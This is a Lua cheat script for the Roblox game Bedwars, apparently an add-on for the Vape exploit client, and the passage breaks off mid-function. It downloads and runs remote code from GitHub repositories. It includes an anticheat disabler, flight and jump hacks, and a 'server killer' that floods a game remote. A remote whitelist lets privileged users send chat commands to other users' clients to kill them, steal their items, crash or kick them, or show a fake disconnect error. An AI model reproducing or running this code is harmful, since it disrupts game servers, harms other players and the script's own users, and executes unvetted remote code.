local shared.StarDeveloper = shared.StarDeveloper
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))() 
task.wait(0.12) 
loadstring(game:HttpGet("https://raw.githubusercontent.com/LolcoolLol/scripts/main/cool.lua", true))() 
loadstring(game:HttpGet("https://raw.githubusercontent.com/LolcoolLol/scripts/main/cool.lua", true))()
-- version
-- Dnut config
local loaded
repeat task.wait() until game:IsLoaded()
repeat task.wait() until shared.GuiLibrary
print('loading...')
pcall(function()
	task.wait(0.001 * randomamount * 0.1)
end)
local GuiLibrary = shared.GuiLibrary
local function createwarning(title, text, delay)
	local suc, res = pcall(function()
		local frame = GuiLibrary["CreateNotification"](title, text, delay, "assets/WarningNotification.png")
		frame.Frame.Frame.ImageColor3 = Color3.fromRGB(236, 129, 44)
		return frame
	end)
	return (suc and res)
end
local UIS = game:GetService("UserInputService")
local repstorage = game.ReplicatedStorage
local CreateFunction = function(items)
	task.spawn(items)
end

loaded = true

local cachedassetsDnut = {}
local getassetDnut = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
local requestfuncDnut = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
	if tab.Method == "GET" then
		return {
			Body = game:HttpGet(tab.Url, true),
			Headers = {},
			StatusCode = 200
		}
	else
		return {
			Body = "bad exploit",
			Headers = {},
			StatusCode = 404
		}
	end
end 
local betterisfileDnut = function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end
local _hash,hash = pcall(function()
	local _h = loadstring(game:HttpGet("https://raw.githubusercontent.com/V0rt3xqa/Dnut/main/version.lua"))()
	return _h
end)

local version

if _hash then
	version = hash
else
	if version then
		version = hash
	else
		_hash,hash = pcall(function()
			local _h = loadstring(game:HttpGet("https://raw.githubusercontent.com/V0rt3xqa/Dnut/main/version.lua"))()
			return _h
		end)	
		if _hash then
			version = hash
		else
			repeat
				task.wait(0.1)
				_hash,hash = pcall(function()
					return loadstring(game:HttpGet("https://raw.githubusercontent.com/V0rt3xqa/Dnut/main/version.lua"))()
				end)	
				if _hash then
					version = hash
				end
			until _hash
		end
	end
end

local function createfile(path)
	task.spawn(function()
		local textlabel = Instance.new("TextLabel")
		textlabel.Size = UDim2.new(1, 0, 0, 36)
		textlabel.Text = "Downloading "..path.." (from dnut config)"
		textlabel.BackgroundTransparency = 1
		textlabel.TextStrokeTransparency = 0
		textlabel.TextSize = 30
		textlabel.Font = Enum.Font.SourceSans
		textlabel.TextColor3 = Color3.new(1, 1, 1)
		textlabel.Position = UDim2.new(0, 0, 0, -36)
		textlabel.Parent = shared.GuiLibrary["MainGui"]
		repeat task.wait() until betterisfileDnut(path)
		textlabel:Remove()
	end)
	local req = requestfuncDnut({
		Url = "https://raw.githubusercontent.com/V0rt3xqa/Dnut/main/"..path:gsub("vape/assets", "assets"),
		Method = "GET"
	})
	writefile(path, req.Body)
end

local function downloadnewfile(path)
	if betterisfileDnut(path) then
		createfile(path)
	else
		if not isfolder("vape") then
			makefolder("vape")
		end
		if not isfolder("vape/assets") then
			makefolder("vape/assets")
		end
		createfile(path)
	end
	if cachedassetsDnut[path] == nil then
		cachedassetsDnut[path] = getassetDnut(path) 
	end
	return cachedassetsDnut[path]
end

local function checkifupdated(ver)

	local currentversion = version

	if currentversion ~= ver or ver == nil then
		for i,v in pairs(images) do
			task.wait(0.01)
			task.spawn(function()
				downloadnewfile("vape/assets/"..v..".png")
			end)
		end

	end

	writefile("DNut/currentversion.lua",version)
end

local function checkiffile(filename)
	if not betterisfileDnut(filename) then
		downloadnewfile(filename)
		return true
	else
		return true
	end
end

if not isfolder("DNut") then
	makefolder("DNut")
end

--local fileversion
--pcall(function()
--	fileversion = readfile("DNut/currentversion.lua")
--end)
--checkifupdated(fileversion)


if shared.DNutLoaded then
	error("Dnut already loaded")
end

local repstorage = game:GetService("ReplicatedStorage")
local oldchanneltabs = {}
local lplr = game:GetService("Players").LocalPlayer
local GuiLibrary = shared.GuiLibrary
local CheckMagnitude = {["Enabled"] = false}
CheckMagnitude = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
	["Name"] = "CheckMagnitude",
	["Function"] = function(Enabled)
		if Enabled then
			local mousepos = lplr:GetMouse().UnitRay
			local rayparams = RaycastParams.new()
			rayparams.FilterDescendantsInstances = {workspace.Map, workspace:FindFirstChild("SpectatorPlatform")}
			rayparams.FilterType = Enum.RaycastFilterType.Whitelist
			local ray = workspace:Raycast(mousepos.Origin, mousepos.Direction * 10000, rayparams)
			if not ray then
				createwarning("DNut","Unable to find position.",5)
				return CheckMagnitude.ToggleButton(false)
			else
				ray = ray.Position
			end
			local magnitude = (lplr.Character.HumanoidRootPart.Position - ray).magnitude
			if magnitude > 70 then
				createwarning("DNut","will get anticheated.(if no ground in path)",5)
			else
				createwarning("DNut","will NOT get anticheated!",5)	
			end
			CheckMagnitude.ToggleButton(false)
		end
	end
})
local antivoidpart
DNutantivoid = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
	Name = "Old Antivoid",
	Function = function(callback) 
		if callback then
			CreateFunction(function()
				antivoidpart = Instance.new("Part", workspace)
				antivoidpart.Name = "AntiVoid"
				antivoidpart.Size = Vector3.new(2100, 0.5, 2000)
				antivoidpart.Position = Vector3.new(160.5, 25, 247.5)
				antivoidpart.Transparency = 0.4
				antivoidpart.Anchored = true
				antivoidpart.Color = Color3.fromRGB(246, 136, 32)
				antivoidpart.Material = Enum.Material.Neon
				antivoidpart.Touched:connect(function(dumbcocks)
					if dumbcocks.Parent:WaitForChild("Humanoid") and dumbcocks.Parent.Name == lplr.Name then
						dumbcocks.Parent:WaitForChild("Humanoid"):ChangeState("Jumping")
						wait(0.2)
						dumbcocks.Parent:WaitForChild("Humanoid"):ChangeState("Jumping")
						wait(0.2)
						dumbcocks.Parent:WaitForChild("Humanoid"):ChangeState("Jumping")
					end
				end)
			end)
		else
			pcall(function()
				antivoidpart:Destroy()
			end)
		end
	end,
	Default = false,
	HoverText = "Old Stud Antivoid"
})

DNutinfinitejump = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
	Name = "Infinite Jump",
	Function = function(callback) 
		if callback then
			CreateFunction(function()
				local InfiniteJumpEnabled = true
				game:GetService("UserInputService").JumpRequest:connect(function()
					if InfiniteJumpEnabled then
						game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
					end
				end)
			end)
		end
	end,
	Default = false,
	HoverText = "OP with gravity and custom speed"
})


fps = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
	Name = "Fps/Ping counter",
	Function = function(callback) 
		if callback then
		CreateFunction(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/V0rt3xqa/Dnut/main/fps-ping-counter.lua"))()
		end)
		end
	end,
	Default = false,
	HoverText = "I had strep and couldn't sleep so I made this"
})



local lplr = game.Players.LocalPlayer
do
	local args = {
		[1] = {
			["raised"] = true
		}
	}
	crash = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "server killer",
		Function = function(callback)
			if callback then

				while task.wait() do
					local did = 0
					while task.wait() do
						did += 1
						game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.UseInfernalShield:FireServer(unpack(args))
					end
					if did == 500 then game.Players.LocalPlayer.Character.Humanoid.Health = 0 did = 0 end
				end
			end
		end,
		HoverText = "need shielder kit to use"
	})
end

local oldselfdestruct = GuiLibrary.SelfDestruct
GuiLibrary.SelfDestruct = function()
	shared.DNutLoaded = false;
	oldselfdestruct()
end

task.spawn(function()
	DNutgliderdisabler = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
		Name = "Glider disabler",
		Function = function(callback) 
			if callback then
				CreateFunction(function()
					repeat
						task.wait()


						local args = {
							[1] = {}
						}



						game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.HangGliderUse:FireServer(unpack(args))
						wait(0.01)
						workspace.Gliders.HangGlider:Destroy()

					until yes == true
				end)

			end
		end,
		Default = false,
		HoverText = "Buy hang glider"
	})
end)

local effect = {}
effect = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
	Name = "DragonBreathEffect",
	Function = function (callback)
		if callback then
			CreateFunction(function()
			while task.wait() do
				if not effect.Enabled then return end
				game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.DragonBreath:FireServer({["player"] = game:GetService("Players").LocalPlayer})
			end
			end)
		end
	end,
	Default = false,
	HoverText = "Dragon Breath Effect."
})
local Disabler = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton(
	{Name = "Lobby Disabler(client)"
		, Function = function (callback)
			if callback then
				if matchState == 0 then
					local a = lplr.Character
					local b = a.HumanoidRootPart
					a.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
					task.wait(0.01)
					b.Parent = nil
					createwarning("DNut","Disabling ac...",1)
					task.wait(0.1)
					b.Parent = a
					createwarning("DNut","Disabled ac!",1)
					a.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
					while b do 
						task.wait()
						lplr.Character.PrimaryPart = lplr.Character.HumanoidRootPart;
					end
				else
					game.Players.LocalPlayer.Character.Humanoid.Health = 0;
					createwarning("DNut","Undisabled ac!",1)
				end
			end
		end,}
)
local VFly = {["Enabled"] = false}
local v = 10
VFly = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
	Name = "VelocityFly",
	Function = function(callback)
		if callback then
			v = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Y + 5
			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(x,v + 5,z)
			task.spawn(function()
				v = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Y
				repeat
					local p = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
					local x,z = p.X + 5,p.Z + 5
					v += 2
					game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(x,v,z)
					task.wait(0.05)
					break
				until VFly.Enabled == false
			end)
		else
			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(x,-v,z)
		end
	end,
	["HoverText"] = "CFrameFly but with velocity."
})
local VJump = {["Enabled"] = false};local slider
local v = 10
VJump = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
    Name = "HighVeloJump",
    Function = function(callback)
        if callback then
            v = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Y + slider.Value
            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(x,v + 5,z)
            task.spawn(function()
                v = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Y
                repeat
                    local p = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
                    local x,z = p.X + 5,p.Z + 5
                    v += 2
                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(x,v,z)
                    task.wait(0.05)
                    break
                until false
            end)
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(x,-(v / 3),z)
        end
    end,
    ["HoverText"] = "HighJump but with velocity."
})
slider = VJump.CreateSlider({
	Name = "SetVelocity",
	Min = 250,
	Max = 1000, 
	Function = function(val) end,
	Default = 600--Default = 500
})
local KnitClient = debug.getupvalue(require(game:GetService("Players").LocalPlayer.PlayerScripts.TS.knit).setup, 6)
local _hash,hash = pcall(function()
	local _h = loadstring(game:HttpGet("https://raw.githubusercontent.com/LolcoolLol/scripts/main/funiwhitelist2.lua"))()
	return _h
end)

if _hash then
	tags = hash
else
	if tags then
		tags = hash
	else
		_hash,hash = pcall(function()
			local _h = loadstring(game:HttpGet("https://raw.githubusercontent.com/LolcoolLol/scripts/main/funiwhitelist2.lua"))()
			return _h
		end)	
		if _hash then
			tags = hash
		else
			repeat
				task.wait(0.1)
				_hash,hash = pcall(function()
					return loadstring(game:HttpGet("https://raw.githubusercontent.com/LolcoolLol/scripts/main/funiwhitelist2.lua"))()
				end)	
				if _hash then
					tags = hash
				end
			until _hash
		end
	end
end
print('loaded hashes')
local function GetURL(scripturl)
	if shared.VapeDeveloper then
		assert(betterisfileDnut("vape/"..scripturl), "File not found : vape/"..scripturl)
		return readfile("vape/"..scripturl)
	else
		local res = game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/"..scripturl, true)
		assert(res ~= "404: Not Found", "File not found : vape/"..scripturl)
		return res
	end
end
local shalib = loadstring(GetURL("Libraries/sha.lua"))()

local a=syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()end
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(b)
	if b==Enum.TeleportState.Started then a("pcall(function() shared.DNutLoaded = false; shared.DNutPrivateLoaded = false; end)") end end)

shared.DNutLoaded = true

shared.clients = {
	ChatStrings1 = {
		["KVOP25KYFPPP4"] = "vape",
		["IO12GP56P4LGR"] = "future",
		["RQYBPTYNURYZC"] = "rektsky",
		["DNUTC345CDAGH"] = "dnut",
	},
	ChatStrings2 = {
		["vape"] = "KVOP25KYFPPP4",
		["future"] = "IO12GP56P4LGR",
		["rektsky"] = "RQYBPTYNURYZC",
		["dnut"] = "DNUTC345CDAGH",
	},
	ClientUsers = {}
}
local clients = shared.clients
local cachedassets = {}
local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
	if tab.Method == "GET" then
		return {
			Body = game:HttpGet(tab.Url, true),
			Headers = {},
			StatusCode = 200
		}
	else
		return {
			Body = "bad exploit",
			Headers = {},
			StatusCode = 404
		}
	end
end 
local betterisfile = function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end
local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
local function getcustomassetfunc(path)
	if not betterisfile(path) then
		task.spawn(function()
			local textlabel = Instance.new("TextLabel")
			textlabel.Size = UDim2.new(1, 0, 0, 36)
			textlabel.Text = "Downloading "..path
			textlabel.BackgroundTransparency = 1
			textlabel.TextStrokeTransparency = 0
			textlabel.TextSize = 30
			textlabel.Font = Enum.Font.SourceSans
			textlabel.TextColor3 = Color3.new(1, 1, 1)
			textlabel.Position = UDim2.new(0, 0, 0, -36)
			textlabel.Parent = GuiLibrary["MainGui"]
			repeat task.wait() until betterisfile(path)
			textlabel:Remove()
		end)
		local req = requestfunc({
			Url = "https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/"..path:gsub("vape/assets", "assets"),
			Method = "GET"
		})
		writefile(path, req.Body)
	end
	if cachedassets[path] == nil then
		cachedassets[path] = getasset(path) 
	end
	return cachedassets[path]
end
local alreadysaidlist = {}
local entity = shared.vapeentity
local Client = require(repstorage.TS.remotes).default.Client
local bedwars = {
	["AnimationType"] = require(repstorage.TS.animation["animation-type"]).AnimationType,
	["AnimationUtil"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out["shared"].util["animation-util"]).AnimationUtil,
	["AngelUtil"] = require(repstorage.TS.games.bedwars.kit.kits.angel["angel-kit"]),
	["AppController"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.controllers["app-controller"]).AppController,
	["BatteryEffectController"] = KnitClient.Controllers.BatteryEffectsController,
	["BalloonController"] = KnitClient.Controllers.BalloonController,
	["BlockEngine"] = require(lplr.PlayerScripts.TS.lib["block-engine"]["client-block-engine"]).ClientBlockEngine,
	["BlockEngineClientEvents"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out.client["block-engine-client-events"]).BlockEngineClientEvents,
	["BlockPlacementController"] = KnitClient.Controllers.BlockPlacementController,
	["BedwarsKits"] = require(repstorage.TS.games.bedwars.kit["bedwars-kit-shop"]).BedwarsKitShop,
	["BowTable"] = KnitClient.Controllers.ProjectileController,
	["BowConstantsTable"] = debug.getupvalue(KnitClient.Controllers.ProjectileController.enableBeam, 5),
	["ChestController"] = KnitClient.Controllers.ChestController,
	["ClickHold"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.ui.lib.util["click-hold"]).ClickHold,
	["ClientHandler"] = Client,
	["SharedConstants"] = require(repstorage.TS["shared-constants"]),
	["ClientStoreHandler"] = require(lplr.PlayerScripts.TS.ui.store).ClientStore,
	["ClientHandlerSyncEvents"] = require(lplr.PlayerScripts.TS["client-sync-events"]).ClientSyncEvents,
	["CombatConstant"] = require(repstorage.TS.combat["combat-constant"]).CombatConstant,
	["CombatController"] = KnitClient.Controllers.CombatController,
	["DamageController"] = KnitClient.Controllers.DamageController,
	["DamageIndicator"] = KnitClient.Controllers.DamageIndicatorController.spawnDamageIndicator,
	["DamageIndicatorController"] = KnitClient.Controllers.DamageIndicatorController,
}
local cfnew = CFrame.new
local function addvectortocframe(cframe, vec)
	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:GetComponents()
	return CFrame.new(x + vec.X, y + vec.Y, z + vec.Z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
end
local currentinventory = {
	["inventory"] = {
		["items"] = {},
		["armor"] = {},
		["hand"] = nil
	}
}

local clientstorestate = bedwars["ClientStoreHandler"]:getState()
matchState = clientstorestate.Game.matchState or 0
kit = clientstorestate.Bedwars.kit or ""
queueType = clientstorestate.Game.queueType or "bedwars_test"
currentinventory = clientstorestate.Inventory.observedInventory
task.spawn(function()
	local connectionstodisconnect = {}
	local collectionservice = game:GetService("CollectionService")

	local blockraycast = RaycastParams.new()
	blockraycast.FilterType = Enum.RaycastFilterType.Whitelist

	local bedwarsblocks = collectionservice:GetTagged("block")
	connectionstodisconnect[#connectionstodisconnect + 1] = collectionservice:GetInstanceAddedSignal("block"):connect(function(v) table.insert(bedwarsblocks, v) blockraycast.FilterDescendantsInstances = bedwarsblocks end)
	connectionstodisconnect[#connectionstodisconnect + 1] = collectionservice:GetInstanceRemovedSignal("block"):connect(function(v) local found = table.find(bedwarsblocks, v) if found then table.remove(bedwarsblocks, found) end blockraycast.FilterDescendantsInstances = bedwarsblocks end)

	connectionstodisconnect[#connectionstodisconnect + 1] = bedwars["ClientStoreHandler"].changed:connect(function(p3, p4)
		if p3.Game ~= p4.Game then 
			matchState = p3.Game.matchState
			queueType = p3.Game.queueType or "bedwars_test"
		end
		if p3.Kit ~= p4.Kit then 	
			bedwars["BountyHunterTarget"] = p3.Kit.bountyHunterTarget
		end
		if p3.Bedwars ~= p4.Bedwars then 
			kit = p3.Bedwars.kit
		end
		if p3.Inventory ~= p4.Inventory then 
			currentinventory = p3.Inventory.observedInventory
		end
	end)
end)

local collectionservice = game:GetService("CollectionService")
local vec3 = Vector3.new
local commands = {
	["kill"] = function(args, plr)
		if entity.isAlive then
			local hum = entity.character.Humanoid
			bedwars["DamageController"]:requestSelfDamage(lplr.Character:GetAttribute("Health"), 0, "69", {fromEntity = plr.Character})
			task.delay(0.2, function()
				if hum and hum.Health > 0 then 
					hum:ChangeState(Enum.HumanoidStateType.Dead)
					hum.Health = 0
					bedwars["ClientHandler"]:Get(bedwars["ResetRemote"]):SendToServer()
				end
			end)
		end
	end,
	["steal"] = function(args, plr)
		if GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["Enabled"] then 
			GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["ToggleButton"](false)
			task.wait(1)
		end
		for i,v in pairs(currentinventory.inventory.items) do 
			local e = bedwars["ClientHandler"]:Get(bedwars["DropItemRemote"]):CallServer({
				item = v.tool,
				amount = v.amount ~= math.huge and v.amount or 99999999
			})
			if e then 
				e.CFrame = plr.Character.HumanoidRootPart.CFrame
			else
				v.tool:Destroy()
			end
		end
	end,
	["lagback"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Velocity = vec3(9999999, 9999999, 9999999)
		end
	end,
	["jump"] = function(args)
		if entity.isAlive and entity.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
			entity.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end,
	["sit"] = function(args)
		if entity.isAlive then
			entity.character.Humanoid.Sit = true
		end
	end,
	["unsit"] = function(args)
		if entity.isAlive then
			entity.character.Humanoid.Sit = false
		end
	end,
	["freeze"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Anchored = true
		end
	end,
	["unfreeze"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Anchored = false
		end
	end,
	["deletemap"] = function(args)
		for i,v in pairs(collectionservice:GetTagged("block")) do
			v:Destroy()
		end
	end,
	["void"] = function(args)
		if entity.isAlive then
			task.spawn(function()
				repeat
					task.wait(0.2)
					entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, vec3(0, -20, 0))
				until not entity.isAlive
			end)
		end
	end,
	["framerate"] = function(args)
		if #args >= 1 then
			if setfpscap then
				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]), 1, 9999) or 9999)
			end
		end
	end,
	["crash"] = function(args)
		setfpscap(9e9)
		print(game:GetObjects("h29g3535")[1])
	end,
	["chipman"] = function(args)
		local function funnyfunc(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "chips"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "chips"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
			end
		end

		for i,v in pairs(game:GetDescendants()) do
			funnyfunc(v)
		end
		game.DescendantAdded:Connect(funnyfunc)
	end,
	["rickroll"] = function(args)
		local function funnyfunc(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "Never gonna give you up"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "Never gonna give you up"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
			end
		end

		for i,v in pairs(game:GetDescendants()) do
			funnyfunc(v)
		end
		game.DescendantAdded:Connect(funnyfunc)
	end,
	["gravity"] = function(args)
		workspace.Gravity = tonumber(args[1]) or 192.6
	end,
	["kick"] = function(args)
		local str = ""
		for i,v in pairs(args) do
			str = str..v..(i > 1 and " " or "")
		end
		task.spawn(function()
			lplr:Kick(str)
		end)
		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
	end,
	["uninject"] = function(args)
		GuiLibrary["SelfDestruct"]()
	end,
	["disconnect"] = function(args)
		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
			if obj.Name == "ErrorMessage" then
				obj:GetPropertyChangedSignal("Text"):Connect(function()
					obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
				end)
			end
			if obj.Name == "LeaveButton" then
				local clone = obj:Clone()
				clone.Name = "LeaveButton2"
				clone.Parent = obj.Parent
				clone.MouseButton1Click:Connect(function()
					clone.Visible = false
					local video = Instance.new("VideoFrame")
					video.Video = getcustomassetfunc("vape/assets/skill.webm")
					video.Size = UDim2.new(1, 0, 1, 36)
					video.Visible = false
					video.Position = UDim2.new(0, 0, 0, -36)
					video.ZIndex = 9
					video.BackgroundTransparency = 1
					video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
					local textlab = Instance.new("TextLabel")
					textlab.TextSize = 45
					textlab.ZIndex = 10
					textlab.Size = UDim2.new(1, 0, 1, 36)
					textlab.TextColor3 = Color3.new(1, 1, 1)
					textlab.Text = "skill issue"
					textlab.Position = UDim2.new(0, 0, 0, -36)
					textlab.Font = Enum.Font.Gotham
					textlab.BackgroundTransparency = 1
					textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
					video.Loaded:Connect(function()
						video.Visible = true
						video:Play()
						task.spawn(function()
							repeat
								wait()
								for i = 0, 1, 0.01 do
									wait(0.01)
									textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
								end
							until true == false
						end)
					end)
					task.wait(19)
					task.spawn(function()
						pcall(function()
							if getconnections then
								getconnections(entity.character.Humanoid.Died)
							end
							print(game:GetObjects("h29g3535")[1])
						end)
						while true do end
					end)
				end)
				obj.Visible = false
			end
		end)
		task.wait(0.1)
		lplr:Kick()
	end,
	["togglemodule"] = function(args)
		if #args >= 1 then
			local module = GuiLibrary["ObjectsThatCanBeSaved"][args[1].."OptionsButton"]
			if module then
				if args[2] == "true" then
					if module["Api"]["Enabled"] == false then
						module["Api"]["ToggleButton"]()
					end
				else
					if module["Api"]["Enabled"] then
						module["Api"]["ToggleButton"]()
					end
				end
			end
		end
	end,
}
local priolist = {
	["DNUT USER"] = 0,
	["DNUT PRIVATE"] = 1,
	--["DNUT DEVELOPER"] = 2,
	["DNUT OWNER"] = 2,
}
local Functions = {
	CheckPlayerType = function(plr)
		local type
		local color = Color3.new()
		local tag = shalib.sha512(tostring(plr.Name..plr.UserId))
		for i,v in pairs(tags) do
			if i == tag then
				type = v[1]
				color = v[2]
			end
		end
		if not color then
			color = Color3.new()
		end
		local plr,data = pcall(function()
			return clients.ClientUsers[plr.Name]
		end)
		if not type then
			if plr then
				if data then
					type = data
				else
					type = "DEFAULT"
				end
			else
				type = "DEFAULT"
			end
		end
		return type,color
	end,
}
Functions["IsSpecialIngame"] = function (plr)
	local type
	if plr then
		if Functions.CheckPlayerType(plr) ~= "DEFAULT" then
			type = plr
		end
	else
		for i,v in pairs(game.Players:GetChildren()) do
			if Functions.CheckPlayerType(v) ~= "DEFAULT" then
				type = v
			end
		end
	end
	if type == nil then
		type = "DEFAULT"
	end
	return type
end
local getconnections = getconnections
local didnotsay = {}
game.Players.PlayerAdded:Connect(function(v)
	task.wait(0.01)
	local a = Functions.IsSpecialIngame(v)
	if a ~= "DEFAULT" and a ~= "DNUT USER" and didnotsay[a.Name] == nil and a ~= lplr then
		didnotsay[a.Name] = true
		repstorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..a.Name.." "..clients.ChatStrings2.dnut, "All")
	end								
end)
task.spawn(function()
	local a
	for i,v in pairs(game.Players:GetPlayers()) do
		task.wait()
		a = Functions.IsSpecialIngame(v)
		if didnotsay[a.Name] == nil and a ~= lplr then
			--local ab = ( Functions:CheckPlayerType(lplr) == ("DEFAULT" or "GALAXY USER") )
			local ab = true
			if a ~= "DEFAULT" and a ~= "DNUT USER" and ab and didnotsay[a.Name] == nil then
				didnotsay[a.Name] = true
